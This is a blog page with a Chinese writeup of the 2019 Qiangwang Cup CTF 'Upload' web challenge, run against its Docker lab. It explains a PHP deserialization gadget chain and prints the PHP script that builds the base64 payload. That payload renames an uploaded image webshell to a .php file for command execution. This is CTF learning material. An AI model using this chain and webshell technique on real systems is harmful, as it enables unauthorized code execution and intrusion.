@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
+  
+  
+  
+  
+  <title>2019强网杯Upload题Writeup | Elapse&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="类似前言一样的废话强网杯过去有一段时间了，开始时因为在外地，没什么时间，下飞机的时候刚好比赛结束，所以题目基本没碰，难得暑假有时间了，把以前在PHP反序列化上的不足弥补了一下，打算照着其他老师傅的writeup把题目做一遍，文内如有雷同，那肯定是我抄的 Docker环境链接:https://github.com/glzjin/qwb_2019_upload 正文打开网页，是一个登录界面注册完后，登">
+<meta name="keywords" content="网络安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019强网杯Upload题Writeup">
+<meta property="og:url" content="https://Ernket.github.io/2019/07/31/2019强网杯Upload题Writeup/index.html">
+<meta property="og:site_name" content="Elapse&#39;s Blog">
+<meta property="og:description" content="类似前言一样的废话强网杯过去有一段时间了，开始时因为在外地，没什么时间，下飞机的时候刚好比赛结束，所以题目基本没碰，难得暑假有时间了，把以前在PHP反序列化上的不足弥补了一下，打算照着其他老师傅的writeup把题目做一遍，文内如有雷同，那肯定是我抄的 Docker环境链接:https://github.com/glzjin/qwb_2019_upload 正文打开网页，是一个登录界面注册完后，登">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1564568502326.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1564568508001.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1564568524431.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1564568528077.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1564568531219.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1564568546257.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1564568565753.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1564568573027.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1564568582452.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1564568646179.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1564568683243.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1564568720008.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1564568724500.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1564568739467.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1564568743212.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1564568749216.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1564568758857.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1564568770184.png">
+<meta property="og:image" content="https://Ernket.github.io/post-images/1564568783026.png">
+<meta property="og:updated_time" content="2019-11-04T04:30:51.540Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019强网杯Upload题Writeup">
+<meta name="twitter:description" content="类似前言一样的废话强网杯过去有一段时间了，开始时因为在外地，没什么时间，下飞机的时候刚好比赛结束，所以题目基本没碰，难得暑假有时间了，把以前在PHP反序列化上的不足弥补了一下，打算照着其他老师傅的writeup把题目做一遍，文内如有雷同，那肯定是我抄的 Docker环境链接:https://github.com/glzjin/qwb_2019_upload 正文打开网页，是一个登录界面注册完后，登">
+<meta name="twitter:image" content="https://Ernket.github.io/post-images/1564568502326.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Elapse&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/avatar.png" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Elapse</a></h1>
+        </hgroup>
+        
+        <p class="header-subtitle">生命的质感和构造，即存在本身</p>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
+            </form>
+            <div id="local-search-result"></div>
+        
+        
+            <script type="text/javascript">
+                (function() {
+                    'use strict';
+                    function getMatchData(keyword, data) {
+                        var matchData = [];
+                        for(var i =0;i<data.length;i++){
+                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
+                                matchData.push(data[i])
+                        }
+                        return matchData;
+                    }
+                    var $input = $('#local-search-input');
+                    var $resultContent = $('#local-search-result');
+                    $input.keyup(function(){
+                        $.ajax({
+                            url: '/search.json',
+                            dataType: "json",
+                            success: function( json ) {
+                                var str='<ul class=\"search-result-list\">';                
+                                var keyword = $input.val().trim().toLowerCase();
+                                $resultContent.innerHTML = "";
+                                if ($input.val().trim().length <= 0) {
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                }
+                                var results = getMatchData(keyword, json);
+                                if(results.length === 0){
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                } 
+                                for(var i =0; i<results.length; i++){
+                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
+                                }
+                                str += "</ul>";
+                                $resultContent.empty();
+                                $resultContent.append(str);
+                                $('#switch-area').hide();
+                            }
+                        });
+                    });
+                })();
+            </script>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="/archives/">所有文章</a></li>
+                        
+                            <li><a  href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github"  target="_blank" href="/xxxxx" title="github">github</a>
+                            
+                                <a class="fl weibo"  target="_blank" href="/xxxxxxxx" title="weibo">weibo</a>
+                            
+                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Python/" style="font-size: 16px;">Python</a> <a href="/tags/linux/" style="font-size: 18px;">linux</a> <a href="/tags/windows/" style="font-size: 14px;">windows</a> <a href="/tags/工具/" style="font-size: 10px;">工具</a> <a href="/tags/总结/" style="font-size: 10px;">总结</a> <a href="/tags/游戏/" style="font-size: 10px;">游戏</a> <a href="/tags/网络安全/" style="font-size: 20px;">网络安全</a> <a href="/tags/虚拟化/" style="font-size: 10px;">虚拟化</a> <a href="/tags/逆向破解/" style="font-size: 12px;">逆向破解</a>
+                    </div>
+                </section>
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://blog.csdn.net/baidu_21483933">csdn</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://segmentfault.com/blog/maocg_web">segmentfault</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.jianshu.com/users/eb37ef89c746/latest_articles">简书</a>
+                    
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">爱动漫,爱游戏,爱编程,爱运动,爱的太多了!</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Elapse</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/avatar.png" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Elapse</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">生命的质感和构造，即存在本身</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="/xxxxx" title="github">github</a>
+                    
+                        <a class="weibo" target="_blank" href="/xxxxxxxx" title="weibo">weibo</a>
+                    
+                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                    
+                </div>
+            </nav>
+        </header>
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-2019强网杯Upload题Writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2019/07/31/2019强网杯Upload题Writeup/" class="article-date">
+      <time datetime="2019-07-31T10:18:08.000Z" itemprop="datePublished">2019-07-31</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2019强网杯Upload题Writeup
+    </h1>
+  
+
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="类似前言一样的废话"><a href="#类似前言一样的废话" class="headerlink" title="类似前言一样的废话"></a>类似前言一样的废话</h1><p>强网杯过去有一段时间了，开始时因为在外地，没什么时间，下飞机的时候刚好比赛结束，所以题目基本没碰，难得暑假有时间了，把以前在PHP反序列化上的不足弥补了一下，打算照着其他老师傅的writeup把题目做一遍，文内如有雷同，那肯定是我抄的</p>
+<p>Docker环境链接:<a href="https://github.com/glzjin/qwb_2019_upload" target="_blank" rel="noopener">https://github.com/glzjin/qwb_2019_upload</a></p>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>打开网页，是一个登录界面<br><img src="https://Ernket.github.io/post-images/1564568502326.png" alt=""><br>注册完后，登录，便是一个上传点<br><img src="https://Ernket.github.io/post-images/1564568508001.png" alt=""><br>一系列的绕过操作试了一遍后，发现都不行，只能上传包含恶意语句的图片<br>打开BP抓包后发现，参数user是一串base64编码的字符串<br><img src="https://Ernket.github.io/post-images/1564568524431.png" alt=""><br>一系列解码后得到序列化内容<br><img src="https://Ernket.github.io/post-images/1564568528077.png" alt=""><br>拎去反序列化，得到一个文件名，猜测上传文件后，将文件名重命名了一遍<br><img src="https://Ernket.github.io/post-images/1564568531219.png" alt=""><br>这个时候，利用目录爆破工具会在网站中找到一个<code>www.tar.gz</code>这个文件，因为这个docker环境没有，所以这里没图。下载下来后，审计中找到了<code>__destruct()</code>魔法函数<br><img src="https://Ernket.github.io/post-images/1564568546257.png" alt=""><br>同时，在Index.php中，找到了身份验证的方法<br><img src="https://Ernket.github.io/post-images/1564568565753.png" alt=""><br> <code>Index.php</code>会对传入的内容进行base64解码，然后反序列化<br><img src="https://Ernket.github.io/post-images/1564568573027.png" alt=""><br>继续审计，发现了<code>Profile.php</code>中，有对文件重命名的操作<br><img src="https://Ernket.github.io/post-images/1564568582452.png" alt=""><br>那么，为了能正常的利用upload_img来进行copy操作，就得将if都过了，首先是这个if</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token variable">$curr_url</span><span class="token operator">=</span>"http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index";</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token variable">$curr_url</span><span class="token punctuation">,</span><span class="token number">302</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>要确保里面的内容不会被执行，<code>checker</code>不赋值或者等于false就好了</p>
+<p>到第二个if</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename_tmp</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".png"</span><span class="token punctuation">;</span>
+    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">ext_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>两个文件名的参数都没有什么过滤，唯一的阻碍是<code>ext_check()</code>，他会判断你的后缀是否为png，没啥用</p>
+<p>第三个if</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ext</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename_tmp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    @<span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename_tmp</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename_tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">img</span><span class="token operator">=</span><span class="token string">"../upload/$this->upload_menu/$this->filename"</span><span class="token punctuation">;</span>
+    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update_img</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Forbidden type!'</span><span class="token punctuation">,</span> <span class="token function">url</span><span class="token punctuation">(</span><span class="token string">'../index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Unknow file type!'</span><span class="token punctuation">,</span> <span class="token function">url</span><span class="token punctuation">(</span><span class="token string">'../index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>首先是ext的值，需要为<code>True</code></p>
+<p>其次还得注意这个</p>
+<pre><code>if(getimagesize($this-&gt;filename_tmp)) {
+</code></pre><p><img src="https://Ernket.github.io/post-images/1564568646179.png" alt=""></p>
+<p>所以得是一个好的图片，里面插入一句话木马才行，然后<code>filename_tmp</code>和<code>finename</code>就是加密后的文件名和源文件名<br>三个IF都解决了，问题是怎么通过反序列化来调用<code>upload_img</code>呢</p>
+<p>在当前文件<code>Profile.php</code>中，我们发现了<code>__get</code>和<code>__call</code>这两个魔法函数<br><img src="https://Ernket.github.io/post-images/1564568683243.png" alt=""></p>
+<pre><code>读取不可访问属性的值时，__get() 会被调用；
+在对象中调用一个不可访问方法时，__call() 会被调用。
+(上面两句内容来自https://www.freebuf.com/articles/web/205690.html的解释)
+</code></pre><p>首先回到Register.php中看<code>__destruct()</code>的操作</p>
+<p><img src="https://Ernket.github.io/post-images/1564568720008.png" alt=""><br><img src="https://Ernket.github.io/post-images/1564568724500.png" alt=""><br>上面两图说明了，checker会去<code>Index()</code>中调用<code>index()</code>（注意区分大小写）</p>
+<p>如果我们将<code>$this-&gt;checker</code>覆盖为<code>类Profile()</code>但是因为<code>Profile()</code>中没有index()，所以会触发<code>__call()</code>魔法函数</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">{</span><span class="token variable">$name</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">{</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">{</span><span class="token variable">$name</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>进入该类之后，会调用一个不存在的对象，导致<code>__get()</code>的触发，所以我们需要在序列化的时候，将<code>except</code>赋值为</p>
+<pre><code>public $except=array(&#39;index&#39;=&gt;&#39;upload_img&#39;);
+</code></pre><p>就可以触发<code>upload_img</code>，达到改名的效果了</p>
+<p>下面是攻击链</p>
+<pre><code>__destruct()-&gt;__call()-&gt;__get()-&gt;upload_img
+</code></pre><p>构造PHP代码：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>web<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name">Profile</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$filename_tmp</span><span class="token operator">=</span><span class="token string">"文件名"</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">"更改后的文件名"</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$upload_menu</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$ext</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$img</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$except</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'upload_img'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">Register</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$registed</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// echo serialize($a);</span>
+<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p>打开网页，我们先上传一个图片马</p>
+<p><img src="https://Ernket.github.io/post-images/1564568739467.png" alt=""></p>
+<p>获取图片路径</p>
+<p><img src="https://Ernket.github.io/post-images/1564568743212.png" alt=""></p>
+<p>然后修改php代码</p>
+<pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token variable">$filename_tmp</span><span class="token operator">=</span><span class="token string">"../public/upload/99afcd599914c2e4fb42620458fb70af/364be8860e8d72b4358b5e88099a935a.png"</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">"/public/upload/99afcd599914c2e4fb42620458fb70af/Elapse.php"</span><span class="token punctuation">;</span>
+</code></pre>
+<p>执行后将生成的base64内容，通过bp发送到服务器上</p>
+<p><img src="https://Ernket.github.io/post-images/1564568749216.png" alt=""></p>
+<p>页面报错</p>
+<p><img src="https://Ernket.github.io/post-images/1564568758857.png" alt=""></p>
+<p>这时我们回到图片的目录下，发现名字已经更改</p>
+<p><img src="https://Ernket.github.io/post-images/1564568770184.png" alt=""><br>试着执行一下命令，成功<br><img src="https://Ernket.github.io/post-images/1564568783026.png" alt=""></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a  href="/2019/07/31/2019强网杯Upload题Writeup/">2019强网杯Upload题Writeup</a></p>
+        <p><span>文章作者:</span><a  href="/" title="访问 Elapse 的个人博客">Elapse</a></p>
+        <p><span>发布时间:</span>2019年07月31日 - 18时18分</p>
+        <p><span>最后更新:</span>2019年11月04日 - 12时30分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/07/31/2019强网杯Upload题Writeup/" title="2019强网杯Upload题Writeup">https://Ernket.github.io/2019/07/31/2019强网杯Upload题Writeup/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://Ernket.github.io/2019/07/31/2019强网杯Upload题Writeup/　　作者: Elapse" title=""></span>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a  href="/2019/08/07/de1ctf-ssrf-me_writeup/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          De1CTF-SSRF Me_writeup
+        
+      </div>
+    </a>
+  
+  
+    <a  href="/2019/07/24/php-serialize/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">PHP反序列化漏洞学习</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#类似前言一样的废话"><span class="toc-number">1.</span> <span class="toc-text">类似前言一样的废话</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <section class="changyan" id="comments">
+  <!--<div id="uyan_frame"></div>-->
+  <div id="SOHUCS"></div>
+  <script charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/changyan.js"></script>
+  <script type="text/javascript">
+    window.changyan.api.config({
+      appid: 'xxxx',
+      conf: 'xxxxxxxxx'
+    });
+  </script>
+</section>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a  href="/2019/08/07/de1ctf-ssrf-me_writeup/" title="上一篇: De1CTF-SSRF Me_writeup">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a  href="/2019/07/24/php-serialize/" title="下一篇: PHP反序列化漏洞学习">
